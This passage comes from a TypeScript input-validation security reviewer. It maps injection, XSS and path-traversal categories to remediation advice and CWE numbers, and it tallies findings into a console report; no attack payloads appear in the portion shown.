    const recommendationMap: Record<string, string> = {
      'SQL_INJECTION': 'Use parameterized queries and input validation to prevent SQL injection',
      'COMMAND_INJECTION': 'Never execute user input as system commands; use safe alternatives',
      'XML_INJECTION': 'Disable external entity processing and validate XML input',
      'XSS': 'Implement proper input validation and output encoding',
      'PATH_TRAVERSAL': 'Validate and sanitize file paths; use whitelist approach',
      'LDAP_INJECTION': 'Use parameterized LDAP queries and input validation',
      'BUSINESS_LOGIC': 'Implement proper business rule validation',
      'DATA_TYPE': 'Implement strict data type validation',
      'FORMAT_VALIDATION': 'Implement format validation using proven patterns',
      'LENGTH_VALIDATION': 'Implement proper length limits for input fields',
      'INJECTION': 'Implement comprehensive input validation and sanitization'
    };

    return recommendationMap[category] || 'Implement proper input validation';
  }

  private getCWEForCategory(category: string): string {
    const cweMap: Record<string, string> = {
      'SQL_INJECTION': 'CWE-89',
      'COMMAND_INJECTION': 'CWE-78',
      'XML_INJECTION': 'CWE-611',
      'XSS': 'CWE-79',
      'PATH_TRAVERSAL': 'CWE-22',
      'LDAP_INJECTION': 'CWE-90',
      'BUSINESS_LOGIC': 'CWE-840',
      'DATA_TYPE': 'CWE-20',
      'FORMAT_VALIDATION': 'CWE-20',
      'LENGTH_VALIDATION': 'CWE-20',
      'INJECTION': 'CWE-20'
    };

    return cweMap[category] || 'CWE-20';
  }

  private async makeRequest(method: string, endpoint: string, data?: any): Promise<any> {
    const config = {
      method: method.toLowerCase(),
      url: endpoint,
      ...(data && ['post', 'put', 'patch'].includes(method.toLowerCase()) && { data })
    };

    return await this.apiClient.request(config);
  }

  private sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  private addVulnerability(vulnerability: ValidationVulnerability): void {
    this.vulnerabilities.push(vulnerability);
  }

  private generateTestResult(): ValidationTestResult {
    const categories = {
      sqlInjection: this.vulnerabilities.filter(v => v.vulnerability.includes('SQL_INJECTION')).length,
      xss: this.vulnerabilities.filter(v => v.vulnerability.includes('XSS')).length,
      commandInjection: this.vulnerabilities.filter(v => v.vulnerability.includes('COMMAND_INJECTION')).length,
      pathTraversal: this.vulnerabilities.filter(v => v.vulnerability.includes('PATH_TRAVERSAL')).length,
      ldapInjection: this.vulnerabilities.filter(v => v.vulnerability.includes('LDAP_INJECTION')).length,
      xmlInjection: this.vulnerabilities.filter(v => v.vulnerability.includes('XML_INJECTION')).length,
      businessLogic: this.vulnerabilities.filter(v => v.vulnerability.includes('BUSINESS_LOGIC')).length,
      dataType: this.vulnerabilities.filter(v => v.vulnerability.includes('DATA_TYPE')).length,
      length: this.vulnerabilities.filter(v => v.vulnerability.includes('LENGTH_VALIDATION')).length,
      format: this.vulnerabilities.filter(v => v.vulnerability.includes('FORMAT_VALIDATION')).length
    };

    const criticalVulns = this.vulnerabilities.filter(v => v.severity === 'CRITICAL').length;
    const highVulns = this.vulnerabilities.filter(v => v.severity === 'HIGH').length;

    let overallSecurity: 'SECURE' | 'VULNERABLE' | 'CRITICAL';

    if (criticalVulns > 0 || (categories.sqlInjection > 0 || categories.commandInjection > 0)) {
      overallSecurity = 'CRITICAL';
    } else if (highVulns > 5 || (categories.xss > 3 || categories.pathTraversal > 3)) {
      overallSecurity = 'VULNERABLE';
    } else {
      overallSecurity = 'SECURE';
    }

    return {
      totalTests: this.testCases.length,
      passed: this.testCases.length - this.vulnerabilities.length,
      failed: this.vulnerabilities.length,
      vulnerabilities: this.vulnerabilities,
      categories,
      overallSecurity
    };
  }
}

/**
 * Run input validation review
 */
export async function runInputValidationReview(baseUrl?: string): Promise<ValidationTestResult> {
  const reviewer = new InputValidationReviewer(baseUrl);
  return await reviewer.runInputValidationReview();
}

/**
 * Generate input validation report
 */
export async function generateInputValidationReport(baseUrl?: string): Promise<void> {
  try {
    console.log('🔍 Starting input validation and sanitization review...');
    const results = await runInputValidationReview(baseUrl);

    console.log('\n' + '='.repeat(80));
    console.log('🔍 INPUT VALIDATION AND SANITIZATION REVIEW REPORT');
    console.log('='.repeat(80));
    console.log(`📊 Total Tests: ${results.totalTests}`);
    console.log(`✅ Passed: ${results.passed}`);
    console.log(`❌ Failed: ${results.failed}`);
    console.log(`🛡️  Overall Security: ${results.overallSecurity}`);

    console.log('\n📊 Vulnerability Categories:');
    console.log(`   SQL Injection: ${results.categories.sqlInjection}`);
    console.log(`   XSS: ${results.categories.xss}`);
    console.log(`   Command Injection: ${results.categories.commandInjection}`);
    console.log(`   Path Traversal: ${results.categories.pathTraversal}`);
    console.log(`   LDAP Injection: ${results.categories.ldapInjection}`);
    console.log(`   XML Injection: ${results.categories.xmlInjection}`);
    console.log(`   Business Logic: ${results.categories.businessLogic}`);
    console.log(`   Data Type: ${results.categories.dataType}`);
    console.log(`   Length Validation: ${results.categories.length}`);
    console.log(`   Format Validation: ${results.categories.format}`);

    if (results.vulnerabilities.length > 0) {
      console.log('\n🚨 Input Validation Vulnerabilities:');
      console.log('-'.repeat(80));

      const groupedVulns = {
        CRITICAL: results.vulnerabilities.filter(v => v.severity === 'CRITICAL'),
        HIGH: results.vulnerabilities.filter(v => v.severity === 'HIGH'),
        MEDIUM: results.vulnerabilities.filter(v => v.severity === 'MEDIUM'),
        LOW: results.vulnerabilities.filter(v => v.severity === 'LOW')
      };

      for (const [severity, vulns] of Object.entries(groupedVulns)) {
        if (vulns.length > 0) {
          console.log(`\n🔴 ${severity} SEVERITY (${vulns.length} vulnerabilities):`);
          vulns.forEach((vuln, index) => {
            console.log(`   ${index + 1}. ${vuln.vulnerability}: ${vuln.description}`);
            console.log(`      Endpoint: ${vuln.method} ${vuln.endpoint}`);
            console.log(`      Field: ${vuln.field}`);
            console.log(`      Recommendation: ${vuln.recommendation}`);
            if (vuln.cwe) console.log(`      CWE: ${vuln.cwe}`);
            console.log('');
          });
        }
      }
    }

    console.log('\n💡 Input Validation Best Practices:');
    console.log('   1. Validate all input on the server side');
    console.log('   2. Use whitelist validation approach when possible');
    console.log('   3. Implement proper data type validation');
    console.log('   4. Sanitize output based on context (HTML, SQL, etc.)');
    console.log('   5. Use parameterized queries for database operations');
    console.log('   6. Implement proper length and format validation');
    console.log('   7. Never trust client-side validation alone');
    console.log('   8. Use proven validation libraries and frameworks');

    console.log('\n' + '='.repeat(80));
    console.log('✅ Input validation review completed');
    console.log('='.repeat(80));

  } catch (error) {
    console.error('❌ Input validation review failed:', error);
    throw error;
  }
}

// Execute review if run directly
if (require.main === module) {
  generateInputValidationReport()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error('Input validation review failed:', error);
      process.exit(1);
    });
}